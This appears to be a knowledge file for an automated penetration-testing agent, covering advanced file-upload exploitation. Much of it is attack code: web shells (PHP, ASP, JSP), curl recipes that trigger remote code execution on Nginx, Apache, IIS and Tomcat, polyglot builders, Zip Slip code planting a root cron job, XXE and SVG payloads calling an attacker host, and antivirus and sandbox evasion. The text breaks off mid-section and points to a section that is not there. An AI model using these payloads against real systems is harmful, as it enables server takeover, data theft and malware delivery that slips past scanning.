---
name: insecure-file-uploads-advanced-deep
description: Advanced file-upload technique classes — per-server execution primitives, polyglot and parser-differential construction, archive attacks, cloud presigned-upload abuse, and processing-race exploitation.
sibling: insecure_file_uploads
load_when: scan_mode == "deep"
---

# Insecure File Uploads — Advanced Techniques

Base `insecure_file_uploads.md` owns the pipeline-mapping framing, the per-server execution table, the ImageTragick / Ghostscript / Struts / SharePoint toolchain class-shapes, and the primary cloud-storage / resumable-multipart bullets. This file owns the expert-tier per-server execution primitives (Nginx FastCGI path-info, Apache MultiViews, IIS 8.3 and web.config), the polyglot and parser-differential construction classes, the archive-attack family, the SVG renderer-differential, the presigned-upload signed-field abuse, and the processing-race primitives. CVE-level version metadata lives in `insecure_file_uploads_novel_deep.md`; this file references CVEs by number with pointers.

## Nginx FastCGI Path-Info PHP Execution

**Primitive.** Nginx's default FastCGI configuration splits `SCRIPT_FILENAME` from `PATH_INFO` using the `fastcgi_split_path_info` directive matching `^(.+?\.php)(/.*)$`. A request to `/uploads/avatar.jpg/x.php` matches `\.php$` on the location block, splits `avatar.jpg` as the script and `/x.php` as the path info, and PHP-FPM — unless `security.limit_extensions` restricts it — executes `avatar.jpg` as PHP code. This converts any image-upload surface into RCE whenever the upload directory is served through a PHP location.

**Preconditions.** All of: (i) Nginx routes `/uploads/*` through a `location ~ \.php$` block (or any block with `fastcgi_pass`); (ii) `fastcgi_split_path_info` is set to the default `^(.+?\.php)(/.*)$` pattern (common on tutorials and defaults); (iii) PHP-FPM's `security.limit_extensions` is unset, empty, or includes `.jpg` / the uploaded extension; (iv) `cgi.fix_pathinfo=1` in php.ini (default on many distros); (v) an upload surface writes to a path served by the above location.

**Attack recipe.**

```bash
# Upload a JPEG-polyglot that passes magic-byte validation but contains PHP:
printf 'GIF89a<?php echo system($_GET["c"]); ?>' > shell.jpg
# Many thumbnailers reject this; adjust to a real JPEG with PHP in a COM/APP0 segment
# if the validator parses the image structure.

# Trigger execution via path-info trailing /x.php:
curl 'https://target/uploads/shell.jpg/x.php?c=id'
# Response body: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `/x.php` suffix is cosmetic — the browser-reachable URL ends in `.php` so Nginx's `location ~ \.php$` matches, but the actual script executed is `shell.jpg`. For blind-blocked `.jpg` paths, try `.png`, `.gif`, `.jpeg` with the same trailing `/x.php`, or stack multiple segments `/uploads/shell.jpg/safe.jpg/x.php`.

**Confirmation signal.** The HTTP response body contains the output of the embedded PHP, with the `Content-Type` set by PHP (text/html) rather than by Nginx's static-file serving. The access log shows the request matched a FastCGI location, not a static-file handler. A control request to `/uploads/shell.jpg` (no trailing path-info) returns the raw bytes with `Content-Type: image/jpeg` — if that control also executes PHP, the issue is `AddType` on the image extension, not path-info.

**Impact.** Full RCE as the FPM pool user from any file-upload sink that reaches a Nginx-served directory. Routes to `rce.md § Post-Exploitation` for the shell-establishment surface and to the base's per-server-execution table for the mapping-level framing. The defender's mitigation is `security.limit_extensions = .php` on every FPM pool AND `cgi.fix_pathinfo=0`; absence of either leaves the primitive live.

## Apache MultiViews and `.htaccess` Chain

**Primitive.** Apache's `mod_negotiation` with `Options MultiViews` serves `/path/shell` by matching any file in `/path/` with that stem — `/path/shell.php`, `/path/shell.phtml`, `/path/shell.php5` — subject to the server's handler mapping. An upload sink that permits non-standard PHP extensions (`.phtml`, `.php5`, `.phar`, `.pht`) via the deployed `AddHandler`/`AddType` config lets the attacker request the extensionless URL and have the right file selected. Separately, a `.htaccess` upload rewrites per-directory handler mappings, so uploading `.htaccess` with `AddType application/x-httpd-php .jpg` enables PHP execution on every `.jpg` in the directory from that point forward.

**Preconditions.** For MultiViews: (i) `Options MultiViews` is enabled on the directory (shipped by default in some stock LAMP installs); (ii) the upload accepts at least one of `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.phps`; (iii) the deployed Apache config maps that extension to `application/x-httpd-php` (common when the admin "allowed PHP5" without explicitly disabling the aliases). For `.htaccess`: (i) `AllowOverride All` or `AllowOverride FileInfo` is set for the upload directory (default on many shared-hosting panels); (ii) the upload accepts files named `.htaccess` (filename validation often rejects empty-stem names, but Unicode-normalization gaps or null-byte legacy stacks defeat the check); (iii) Apache re-reads `.htaccess` on each request (default).

**Attack recipe.**

```bash
# MultiViews — request the extensionless stem; Apache picks shell.phtml:
curl 'https://target/uploads/shell'       # ← resolves to shell.phtml
curl 'https://target/uploads/shell?c=id'

# .htaccess shim — upload a .htaccess that maps .jpg to PHP:
cat > .htaccess <<'EOF'
<Files "shell.jpg">
  SetHandler application/x-httpd-php
</Files>
EOF
# upload .htaccess + shell.jpg (containing PHP), then:
curl 'https://target/uploads/shell.jpg?c=id'
```

**Confirmation signal.** The response is dynamic content with PHP-set headers, not the raw bytes of the uploaded file. For MultiViews, the `Content-Location` header on the response names the actual file Apache selected (`Content-Location: shell.phtml`), confirming the negotiation path. For `.htaccess`, the first request to the shimmed file after the `.htaccess` upload transitions from `Content-Type: image/jpeg` to `Content-Type: text/html` — the per-directory override took effect.

**Impact.** Full RCE as the Apache user from file-upload surfaces that reject `.php` but accept alias extensions, or that accept dotfile names at all. The `.htaccess` path is particularly dangerous because the shim applies to every subsequent file in the directory — the attacker can convert any pre-existing upload into a shell by rewriting the handler mapping. Defender mitigation is `AllowOverride None` on the upload directory AND an explicit extension deny-list that includes every PHP alias; both are needed because `AllowOverride All` + any accepted PHP alias is an immediate RCE.

## IIS Legacy Quirks and web.config Shim

**Primitive.** IIS exposes several legacy filename-processing behaviors that convert upload surfaces into RCE: the IIS6-era semicolon-truncation (`shell.asp;.jpg` served as `shell.asp`), 8.3 short-name alias resolution (`SHELL~1.ASP` resolves to `shell.aspx` when LFN scanning is partial), and `web.config` upload at the directory level to add handler mappings for custom extensions. Each primitive hinges on a specific IIS version/configuration — the attacker fingerprints the server and selects the matching primitive.

**Preconditions.** For semicolon-truncation: IIS 6.x or an application pool configured in classic mode with the IIS6 compatibility handler active; the upload surface accepts filenames containing `;`. For 8.3 short-name: NTFS short-name generation enabled (`fsutil 8dot3name query`) and the application maps the short name to a handled extension. For `web.config`: `AllowOverride`-equivalent (web.config at a child directory overrides parent) AND the directory accepts a file named `web.config`.

**Attack recipe.**

```http
# Semicolon truncation (IIS6-era, still in classic-mode AppPools):
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.asp;.jpg"
Content-Type: image/jpeg

<%eval request("c")%>

# Serving the uploaded file:
GET /uploads/shell.asp;.jpg?c=Server.CreateObject("WScript.Shell").Run("calc")

# web.config shim — upload web.config to the upload directory:
# web.config contents:
<?xml version="1.0"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="ASP.NET" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"
           modules="ManagedPipelineHandler" preCondition="integratedMode" />
    </handlers>
  </system.webServer>
</configuration>

# Then upload shell.jpg containing ASPX markup; request it, IIS treats as ASPX.
```

**Confirmation signal.** The uploaded file's response transitions from static-file bytes to IIS-rendered dynamic content; the `X-AspNet-Version` or `X-Powered-By: ASP.NET` header appears on responses where it was absent for sibling static files. For 8.3 short-name, enumerating short names (via trailing `~1` and `*` wildcards on older IIS versions) reveals the attack surface.

**Impact.** RCE as the Application Pool identity on legacy IIS deployments and on modern IIS where the upload directory accepts `web.config`. The `web.config` shim is particularly persistent — the handler mapping applies to every subsequent file in the directory until the config is removed. Defender mitigation: deny `.config` extensions and `;` characters in uploaded filenames; disable NTFS 8.3 short-name generation; run the AppPool with the least-privilege identity.

## Tomcat / Jetty JSP Upload and PUT

**Primitive.** Tomcat and Jetty serve JSP files from the WAR's directory structure; an upload that writes a `.jsp` or `.jspx` file to a web-accessible path executes as JSP on request. Separately, the default Tomcat `DefaultServlet` has a `readonly` init-parameter — if set to `false`, HTTP `PUT` writes arbitrary files to the WAR, converting any method-permitted path into shell delivery.

**Preconditions.** For JSP upload: an upload sink that writes to a path inside a deployed webapp. For PUT: `readonly=false` on the DefaultServlet (uncommon but observed on dev deployments and misconfigured appliances). For `/manager` WAR deploy: the Tomcat manager app is reachable AND the attacker has credentials (default `tomcat:tomcat`, `admin:admin`, or empty password on legacy installs).

**Attack recipe.**

```jsp
<%-- Served from a Tomcat-reachable path: --%>
<%@ page import="java.util.*,java.io.*"%>
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

```bash
# PUT upload against readonly=false DefaultServlet:
curl -X PUT --data-binary @shell.jsp 'https://target/app/shell.jsp'
curl 'https://target/app/shell.jsp?c=id'

# /manager/text WAR deploy with creds:
cp shell.jsp WEB-INF/
jar cvf shell.war shell.jsp WEB-INF/
curl --user tomcat:tomcat --upload-file shell.war \
  'https://target/manager/text/deploy?path=/shell&update=true'
```

**Confirmation signal.** The response to the uploaded JSP's URL is dynamic JSP output (not raw file bytes); the `Server: Apache-Coyote/1.1` or `Server: Jetty(x.y.z)` header confirms the engine. For PUT, the response is `201 Created` or `204 No Content`; a sibling `GET` on the written path returns the uploaded content. For `/manager` deploy, the response includes `OK - Deployed application at context path /shell`.

**Impact.** RCE as the Tomcat user from any upload sink reaching the WAR path, or from any PUT-permitting DefaultServlet, or from any accessible Manager app with weak creds. Routes to `rce.md` for the post-upload shell-establishment surface.

## Polyglot Construction Classes

**Primitive.** A polyglot is a single file whose bytes satisfy two or more file-format parsers simultaneously — a GIF+PHP that passes a magic-byte-plus-ImageMagick validator and executes as PHP, a PNG+PHP that embeds PHP code in a tEXt or iTXt chunk, a PDF+ZIP that is both a valid PDF and a valid archive, a JPEG+ZIP where the ZIP central-directory lives in the JPEG's trailing bytes. The construction class is reusable: a validator that reads only the leading magic bytes and a consumer that executes the trailing or embedded content are the pattern.

**Preconditions.** All of: (i) the upload validator checks magic bytes OR runs a format-specific parser (ImageMagick identify, PIL Image.open, exiftool, PDF-syntax check) but does not execute or sanitize the trailing/embedded content; (ii) the consumer processes the file in a way that reaches the embedded payload (PHP interpretation of the file as a script, JSP interpretation, ZIP extraction, EXIF parsing in a vulnerable version); (iii) the storage path and serving path together satisfy the per-server execution primitives above.

**Attack recipes (per polyglot).**

```bash
# GIF89a + PHP: byte-exact leading signature, PHP after:
printf 'GIF89a;\x00\x00\x00\x00<?php echo system($_GET["c"]); ?>' > poly.gif
# Validates as GIF (ImageMagick identify succeeds); executes as PHP when
# served through a FastCGI location that executes .gif.

# PNG + PHP in tEXt chunk — survives most "image sanitizers" that preserve metadata:
python3 -c '
import struct, zlib
def chunk(t, d):
    return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t+d) & 0xffffffff)
png = b"\x89PNG\r\n\x1a\n"
png += chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
png += chunk(b"tEXt", b"Comment\x00<?php system($_GET[\"c\"]); ?>")
png += chunk(b"IDAT", zlib.compress(b"\x00\xff\xff\xff"))
png += chunk(b"IEND", b"")
open("poly.png", "wb").write(png)
'

# PDF + ZIP (shared outer PDF, ZIP central-directory in trailing bytes):
# Build with pdfzip or similar; the PDF opens in a reader AND unzips as an archive.

# JPEG + ZIP: ZIP central-directory recognition is byte-trailing, JPEG is byte-leading:
cat image.jpg contents.zip > poly.jpg
# unzip poly.jpg → extracts contents.zip's files; identify poly.jpg → valid JPEG.
```

**Confirmation signal.** The validator accepts the file (success response, no "invalid image" error); the consumer processes the embedded payload (PHP output in HTTP body, extracted files from the ZIP consumer, exfiltrated data from the EXIF parser). A validator that rejects the file *after* the magic-byte check often has a defense-in-depth second parse — fingerprint which parser rejected it.

**Impact.** Converts a magic-byte-only validator into a code-execution path with no need to defeat the validator; the primitive is the entire reason "magic byte check" is not sufficient validation. Routes to `rce.md` for execution, to `xss.md` for client-side-embedded polyglot payloads (HTML+image), and to `path_traversal_lfi_rfi.md` for the LFI-reads-the-polyglot chain.

## SVG Renderer-Differential

**Primitive.** An upload that permits SVG and runs the SVG through two different parsers — one for validation (e.g. a DOMPurify-style sanitizer running in a Node sandbox), one for rendering/thumbnailing (e.g. librsvg, Chromium headless, resvg) — produces a differential: the sanitizer and the renderer disagree about the SVG's structure, so the sanitized output still carries active content that the renderer executes. The class generalizes beyond SVG — any format where two implementations disagree about parse structure is a differential.

**Preconditions.** All of: (i) two or more parsers process the SVG (validator at upload-time, renderer at serve-time or thumbnail-time); (ii) the validator is a different implementation from the renderer; (iii) the renderer has an execution sink — JS/CSS execution for browser-based renderers, external-entity resolution for XML-based renderers, URL fetching for `<image href>` resolution.

**Attack recipe.**

```xml
<!-- Payload: DOMPurify treats <script> as script and strips it, but librsvg
     treats <![CDATA[]]> content as text — bind a script via CSS or SMIL animation
     that the sanitizer does not recognize as active content: -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <style>@import url("https://attacker/exfil.css");</style>
  <animate attributeName="xlink:href"
    values="https://attacker/beacon?t={ time}"
    dur="1s" fill="freeze"/>
  <image href="https://attacker/pixel"/>
</svg>
```

For XML-parser differential (XXE):

```xml
<!-- Sanitizer strips <script>; XML parser resolves external entity on parse: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

The server-side rsvg (or ImageMagick's MSVG delegate, or any Chromium-headless rasterizer that happens to resolve entities) renders the file content into the output PNG; the sanitizer did not see the DOCTYPE as active.

**Confirmation signal.** The rendered output (thumbnail PNG, generated preview) contains data the sanitizer should have stripped — the beacon pixel loads from the attacker's server (observable in the attacker's HTTP log), the exfiltrated file content appears in the rendered image. The validator's log shows the upload was sanitized ("stripped 0 script elements").

**Impact.** Server-side XXE from an SVG upload (route to `xxe.md § SVG Delivery`), stored XSS from a thumbnail-rendered SVG served inline (route to `xss.md § SVG DOM`), file-exfiltration via rendered-output image, SSRF via `<image href>` resolution to internal URLs. The differential class generalizes — the hunt is for any format where validator ≠ consumer.

## PHP Filter-Chain Exploitation of Upload Paths

**Primitive.** PHP's `php://filter` wrapper applies a chain of encoders to a resource; a chain of `convert.base64-decode | convert.iconv.*.*` filters can turn an arbitrary PHP file read through `include` into attacker-controlled bytes — classic LFI-to-RCE even when the inclusion sink has no writable file. For file-upload surfaces that generate predictable stored paths and have a sibling LFI sink, the chain is the final leg: upload any file (no need for a polyglot), then invoke the LFI with `php://filter/convert.base64-decode|.../resource=<stored-path>`. The uploaded content doesn't need to be valid PHP; the filter chain constructs the executable payload from the plain upload bytes.

**Preconditions.** All of: (i) the application has an LFI/include sink that accepts a user-controllable path AND does not restrict the `php://filter` scheme (PHP's `allow_url_include` state is not required for `php://filter`); (ii) an upload surface produces a known stored path; (iii) PHP's `convert.iconv` filter supports the required source and target charsets (standard glibc iconv on Linux provides enough charsets for the chain generator to succeed).

**Attack recipe.**

```bash
# Use a filter-chain generator (e.g. synacktiv/php_filter_chain_generator) to
# construct a chain that transforms attacker bytes into the PHP payload:
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Output: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...

# Trigger the LFI against the stored upload path:
curl 'https://target/view?page=php://filter/convert.iconv.UTF8.CSISO2022KR|...|resource=/uploads/benign.txt'
# PHP's include evaluates the filtered content as PHP; the generator engineered
# the chain so that the output is <?php system($_GET["c"]); ?>.
```

The uploaded file content is irrelevant — the chain's output depends only on the chain and on PHP's filter implementation, not on the input bytes. The upload is still necessary to supply the `resource=` target; many deployments accept writes to a shared `/tmp/php*` directory, and PHP's own session files are also chain-reachable without a dedicated upload.

**Confirmation signal.** The LFI's response body contains the output of the PHP constructed by the chain — in the example, the output of `id`. The upload surface's log shows the benign file was accepted; the LFI's log shows the include() succeeded without a "file not found" error.

**Impact.** Full RCE from the combination of upload + LFI even when the upload cannot produce executable content on its own. Routes to `path_traversal_lfi_rfi.md § PHP Filter Chain` for the generator details and the chain-reachable path families.

## Archive Attack Family (Zip Slip and Variants)

**Primitive.** Archive formats (ZIP, TAR, 7z, RAR) store entry filenames that extractors use to compose output paths. Insufficient path containment during extraction — treating `../` or absolute paths or symlinks as valid entry names — writes extracted content outside the intended directory. The class spans multiple variants: traversal-in-name ("Zip Slip" baseline), symlink-in-archive (the archive contains a symlink entry that points outside the target), nested archive (an archive within an archive that the extractor recursively unpacks), case-insensitive collision on NTFS/macOS (two entries whose names differ only in case overwrite each other), Unicode-normalization collision (NFC vs NFD paths resolve to the same filesystem entry), and ZIP-encryption bypass (a password-protected archive whose outer header passes AV scanning but whose inner entries are not scanned).

**Preconditions.** All of: (i) an upload-and-extract surface processes archives; (ii) the extractor does not canonicalize entry paths against the target directory before writing (modern Node `unzipper` and Python `zipfile` require explicit containment; older libraries and application-level extractors are commonly vulnerable); (iii) the writable target directory contains or shares a parent with a path the attacker wants to overwrite (SSH keys, cron files, web.config, service unit files, systemd timer units); (iv) for symlink variants, the extractor respects symlinks in entries (default behavior in several TAR implementations).

**Attack recipe.**

```python
# Zip Slip baseline — crafted ZIP with ../ entry name:
import zipfile
with zipfile.ZipFile("payload.zip", "w") as z:
    # Normal extractors preserve the leading ../ sequence:
    z.writestr("../../../etc/cron.d/attacker", "* * * * * root /bin/sh -c '...' \n")
    # Companion legitimate entry so the archive looks normal:
    z.writestr("readme.txt", "readme")

# Symlink-in-TAR — the entry is a symlink to a target outside the extraction root:
import tarfile, os
os.symlink("/etc/passwd", "etc_passwd")
with tarfile.open("payload.tar", "w") as t:
    t.add("etc_passwd", arcname="link")
# Extracting creates `link` as a symlink to /etc/passwd; a subsequent
# write to `link` writes to /etc/passwd.
```

For case-insensitive collision on NTFS/HFS+:

```python
# Two entries that collide after case-folding; the second overwrites the first,
# which can bypass "unique filenames" invariants in the extractor:
z.writestr("Config.ini", "safe-config")
z.writestr("CONFIG.INI", "attacker-config")
```

**Confirmation signal.** The extracted directory contains files outside the intended target — the attack's hallmark is a `find` of the extraction root turning up `../` entries, or a `ls` of a system directory showing files that match the archive's traversal targets. For symlink-in-TAR, the symlink's target is outside the extraction root; a subsequent write-through confirms the chain. For ZIP-encryption bypass, the AV log shows the archive was scanned (`CLEAN`) but the extracted contents contain the EICAR string or the actual payload.

**Impact.** Arbitrary file write anywhere the extraction process has write permission, including over web.config / `.htaccess` / cron files / systemd units / SSH authorized_keys / shared libraries — straight to RCE in several of these paths. The nested-archive and encrypted-archive variants defeat perimeter scanning without defeating the extractor. Routes to `path_traversal_lfi_rfi.md § File-Write-to-Execution` for the writable-path discovery.

## S3 POST Policy Signed-Field Abuse

**Primitive.** AWS S3's browser-based POST upload uses a signed `policy` document whose `conditions` array constrains which fields and values the client can submit. Fields NOT listed in the `conditions` array are accepted anyway. A server-side policy that constrains `key` (prefix) and `Content-Type` (image/*) but forgets `x-amz-meta-*`, `Cache-Control`, or `Content-Disposition` lets the attacker set those fields to arbitrary values — most impactfully, `Content-Disposition: inline` + `Content-Type: text/html` + a tightly-constrained but still-arbitrary key within the prefix.

**Preconditions.** All of: (i) the server signs an S3 POST policy that includes partial `conditions`; (ii) the attacker can discover the signing endpoint's unconstrained fields (test by submitting the field; S3 returns `SignatureDoesNotMatch` if the field is in `conditions`, `AccessDenied` with an `Policy Condition failed` message if a `starts-with` or `eq` fails, and `Success` if the field is unconstrained); (iii) the uploaded object is served with its stored metadata (Content-Disposition, Content-Type) applied to the HTTP response, which is default behavior on direct bucket serving.

**Attack recipe.**

```bash
# Discover unconstrained fields by diffing responses:
# 1. Fetch a signed policy (POST policy document, signature, AWS credential):
curl 'https://app/api/upload-sign?prefix=user-123'  # returns {policy, signature, ...}

# 2. Submit a POST with the signed values + an attacker-controlled field:
curl -X POST 'https://bucket.s3.region.amazonaws.com/' \
  -F 'key=user-123/avatar.jpg' \
  -F 'policy=<base64>' \
  -F 'X-Amz-Signature=<sig>' \
  -F 'X-Amz-Algorithm=AWS4-HMAC-SHA256' \
  -F 'X-Amz-Credential=<cred>' \
  -F 'X-Amz-Date=<date>' \
  -F 'Content-Type=text/html' \
  -F 'Content-Disposition=inline' \
  -F 'file=@malicious.html'

# 3. If the policy forgot to constrain Content-Type/Disposition, the object
# is now served inline as HTML from the bucket's origin.
```

**Confirmation signal.** The uploaded object's HTTP response headers show the attacker-set Content-Type and Content-Disposition — `curl -I` returns `Content-Type: text/html; Content-Disposition: inline`. The browser renders the file inline rather than downloading it. For the key-injection variant, the uploaded object lands at `key=../admin/shell.jsp` or any path the policy's `starts-with` did not constrain, confirmable via S3 LIST on the bucket.

**Impact.** Stored XSS on the bucket's origin (origin is often `*.s3.amazonaws.com` or a CloudFront-fronted custom domain that the parent app trusts); arbitrary-path writes to the bucket in the key-injection variant; cache poisoning via unconstrained `Cache-Control` and `Content-Encoding`. Routes to `xss.md § Stored XSS` for the exploitation surface and to `subdomain_takeover_advanced_deep.md § CSP script-src Gadget` if the bucket's origin is in the parent app's CSP allowlist.

## Content-Type and MIME Bypass Matrix

**Primitive.** The browser's decision to render a response as script, HTML, image, or attachment is a function of five dimensions: (1) the request-time `Content-Type` the uploader set in the multipart form-data part header, (2) the server-side MIME detection (magic-byte sniff via libmagic/python-magic, extension-based inference, consumer-library inference), (3) the response-time `Content-Type` the server emits on download, (4) the response-time `Content-Disposition` (`inline` vs `attachment`), and (5) the response-time `X-Content-Type-Options: nosniff` state. The primitive is the matrix of attacker-controllable dimensions vs server-enforced dimensions — anywhere the attacker's input leaks into dimensions 3, 4, or 5, stored XSS or malware delivery follows. The class generalizes beyond file uploads to any user-controlled byte stream served back.

**Preconditions.** All of: (i) the upload surface stores the file and later serves it to a browser context (profile pictures, document previews, direct download, email attachments served via web); (ii) at least one of the five dimensions is attacker-controllable through either the upload API, the request headers, the signed-URL fields, or the content itself; (iii) the matching dimension on the server side fails to enforce a safe-rendering outcome (missing `nosniff`, `inline` Disposition on user content, Content-Type reflection, MIME-sniff on magic bytes).

**Attack matrix (per dimension).**

```http
# Dimension 1 — multipart Content-Type the attacker sets:
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: text/html          # ← attacker claims text/html
...

# What happens: some servers trust the part header's Content-Type verbatim and
# store it alongside the blob; later the download endpoint returns it. The
# "image upload" is now a serving-time HTML payload.
# Alternative: some servers detect from content and ignore the part header —
# bypass requires polyglot content (per the Polyglot Construction Classes section).

# Dimension 2 — server-side MIME detection differential:
# libmagic reads leading bytes; python-magic wraps libmagic; file(1) uses the
# distro's /usr/share/misc/magic file; Node's `file-type` reads only the first
# 4100 bytes. A content whose first 4100 bytes match "JPEG" but whose body is
# HTML survives all four detectors AND renders as HTML in the browser.
# Fingerprint the detector by uploading each magic-prefix pair and observing
# which the server rejects.

# Dimension 3 — server-side Content-Type reflection on download:
# Many stacks reflect the stored Content-Type on download. If the attacker
# controls the stored value (direct bucket, uploader-trusted multipart,
# S3 POST policy without a Content-Type condition), the response Content-Type
# is attacker-controlled. Example served from bucket:
GET /avatars/<key> HTTP/1.1
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8                                       # ← attacker chose
Content-Disposition: inline

# Dimension 4 — Content-Disposition inline vs attachment:
# attachment → browser downloads, does not render; inline → browser renders.
# The attacker needs inline for stored-XSS. Many apps set attachment on
# user downloads but forget it for direct bucket serving.

# Dimension 5 — X-Content-Type-Options nosniff:
# nosniff present → browser respects Content-Type exactly; nosniff absent →
# browser may sniff and treat text/plain or application/octet-stream as HTML
# if the body looks like HTML. The sniff logic varies per browser (Chrome's
# MIME sniffer is public; Firefox's and Safari's differ in corner cases).
# Fire a polyglot with text/plain response and no nosniff; Chrome treats as
# HTML if content starts with "<!DOCTYPE html>" or "<html>".
```

The attacker's workflow is: (a) upload a probe file whose attacker-claimed Content-Type is `text/html` and content is `<script>alert(1)</script>`; (b) download the file and read the response Content-Type + Disposition + nosniff; (c) if nosniff is absent AND Content-Type reflects AND Disposition is inline, the primitive is confirmed; (d) if nosniff is present, pivot to polyglot content that satisfies both the MIME detector and the HTML renderer's sniff rules.

**Confirmation signal.** A download of the uploaded file renders as script in the browser — `document.title` changes, an alert fires, or a beacon reaches the attacker's log. Specifically: the response includes `Content-Type: text/html` or `Content-Type: image/svg+xml` with `Content-Disposition: inline` and no `X-Content-Type-Options: nosniff`; OR the response includes a Content-Type that nominally should not render as HTML (text/plain, application/octet-stream) but the body matches a browser's HTML-sniff heuristic AND nosniff is absent, so Chrome renders as HTML anyway.

**Impact.** Stored XSS from any upload surface that misses one or more of the five dimensions; cross-origin impact when the serving origin is a trusted subdomain (route to `subdomain_takeover_advanced_deep.md § CSP script-src Gadget`); malware delivery when the attacker-controlled Content-Type is `application/octet-stream` with a filename that encourages double-click execution on Windows. The matrix is the finding; the specific missed dimension is the fix target. Routes to `xss.md § Stored XSS` for exploitation and to the Polyglot Construction Classes section above for the content-byte path when dimension 2 is strict.

## AV / Sandbox-Escape Primitives

**Primitive.** Anti-virus and content-disarm (CDR) pipelines sit between the upload and the serving/consumer layer; a payload that defeats the specific scanner's detection reaches the downstream consumer with its payload intact. The class spans several escape techniques: EICAR-string encoding (base64, hex, split-across-chunks) to defeat signature-only scanners; polyglot files whose structure the scanner's parser does not fully resolve; password-protected archives whose outer header passes scanning but whose inner entries are not inspected; delayed-execution payloads whose malicious behavior triggers only after N calls or on specific calendar dates; in-memory-only payloads (fileless) that write nothing to disk and so are invisible to disk-based scanners; and sandbox-evasion techniques where the payload detects a sandbox environment (specific MAC prefixes, VM-only drivers, mouse-movement absence) and declines to execute until on a real host.

**Preconditions.** All of: (i) an AV/CDR scanner sits between the upload and the consumer; (ii) the scanner is signature-based (ClamAV, Windows Defender, legacy pipeline) OR behavior-sandbox-based (Cuckoo, hybrid-analysis-ish); (iii) the attacker can craft payloads that defeat the specific scanner's detection class. For sandbox-evasion specifically: the scanner is a dynamic-analysis sandbox AND the sandbox lacks fingerprint-resistance (default VM MAC prefixes, missing user activity, missing recent files).

**Attack recipes (per escape).**

```bash
# EICAR encoding — a signature-matched scanner fires on the exact EICAR string.
# Encode it to defeat the signature without changing the payload's semantics for a
# consumer that decodes:
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | \
  base64 > encoded-eicar.b64
# Upload encoded-eicar.b64; the AV sees random base64 and does not match EICAR.
# A consumer that base64-decodes before processing re-materializes EICAR.

# Polyglot that confuses the scanner's parser — a ZIP wrapping EICAR inside a
# JPEG container the ZIP spec allows (ZIP's central directory can live anywhere
# in the file). The scanner parses leading bytes as JPEG and short-circuits;
# the extractor finds the ZIP central directory and extracts EICAR.
cat image.jpg eicar.zip > poly.jpg
# unzip poly.jpg → extracts EICAR into disk; AV scanning the leading bytes saw JPEG only.

# Password-protected archive — the inner payload is encrypted; signature scanning
# of the outer bytes finds no match. CDR pipelines commonly skip encrypted archives
# with a warning rather than blocking them.
zip -P "attacker-password" payload.zip malicious.exe

# Delayed-execution payload — the payload sleeps or checks for N invocations
# before running the malicious action. The sandbox's analysis window is bounded
# (typically 60-180 seconds); a sleep(300) or N-call-counter trivially defeats
# dynamic analysis.
# Example in a Python payload reached via upload+LFI chain:
# import time; time.sleep(600); os.system(malicious_command)

# Fileless / in-memory payload — the payload is a shell command that fetches
# and executes without touching disk; signature-of-disk scanners see nothing.
# The upload is small (download-and-exec oneliner) and the actual payload is
# resolved at runtime from an attacker-controlled URL.

# Sandbox-evasion — detect the sandbox and bail:
# Check for VM MAC prefixes (00:05:69 VMware, 00:0C:29 VMware, 00:1C:14 VMware,
# 00:50:56 VMware, 00:03:FF Hyper-V, 08:00:27 VirtualBox);
# check for mouse activity (sandbox has none);
# check for recent files (sandbox has none);
# check for installed software count.
# If any of these flag "likely sandbox", exit normally; otherwise, execute payload.
```

For the specific AV-race variant (the race between upload-accept and AV-scan-complete), see `Processing Race Primitives` above; the AV-escape family here is about defeating the scan outright, not racing it.

**Confirmation signal.** The payload reaches the downstream consumer with its content intact — the uploaded file lands at the serving path or the processing-queue consumes it without rejection. The AV log either shows "clean" or shows nothing (the scanner's parser could not resolve the file). For sandbox-evasion specifically, the payload shows the sandbox-detection branch firing (a specific log line or an outbound beacon from the detection logic) and declining to execute, which the attacker observes from the sandbox-report rather than from runtime.

**Impact.** Malicious payloads reach downstream consumers (user browsers, document converters, backend workers) that treat the file as trusted because the AV scan passed. Combined with the per-server execution primitives (Nginx FastCGI, Apache MultiViews, IIS web.config, Tomcat PUT), the escaped payload executes server-side; combined with the Content-Type Matrix above, the escaped payload executes client-side as stored XSS. Routes to `rce.md` for server-side execution and to `xss.md` for client-side.

## ExifTool DjVu-Annotation Eval Class

**Primitive.** ExifTool's DjVu format support historically parsed annotation strings through a path that reached a Perl `eval` sink; a crafted DjVu or an EXIF-wrapper carrying a DjVu annotation chunk triggered Perl code execution during metadata read. The specific CVE lineage is in `insecure_file_uploads_novel_deep.md`; the class pattern is "metadata-parser invokes a dynamic-evaluation sink on attacker-controlled strings," and it generalizes beyond DjVu to any ExifTool code path that passed user strings to `eval` or `qr//` with embedded code constructs.

**Preconditions.** All of: (i) the upload pipeline reads metadata via exiftool (common in gallery apps, media pipelines, Camera Raw workflows); (ii) exiftool's version is in the vulnerable range for the specific CVE (version-match required — see `insecure_file_uploads_novel_deep.md`); (iii) the exiftool invocation does not use `-stay_open=False` isolation or a seccomp jail that blocks process execution.

**Attack recipe.**

```bash
# A DjVu file crafted with a malicious annotation chunk; the class is
# illustrative — the version-boundary and specific chunk structure are
# in the novel sibling. Test flow:
exiftool -all= -tagsfromfile crafted.djvu target.jpg
# If exiftool reaches the vulnerable code path during metadata merge,
